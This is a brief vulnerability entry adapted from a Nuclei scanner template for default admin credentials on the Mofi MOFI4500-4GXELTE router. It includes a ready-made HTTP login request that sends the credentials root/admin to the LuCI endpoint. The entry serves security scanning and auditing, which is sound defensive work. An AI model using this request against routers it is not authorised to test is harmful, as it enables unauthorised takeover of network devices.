# Nuclei Template: MOFI4500-4GXeLTE-V2 Default Login
**Template ID:** mofi4500-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`mofi4500-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Mofi Network MOFI4500-4GXELTE wireless router default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /cgi-bin/luci/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=root&password=admin
```

## References
- https://www.cleancss.com/router-default/Mofi_Network/MOFI4500-4GXELTE
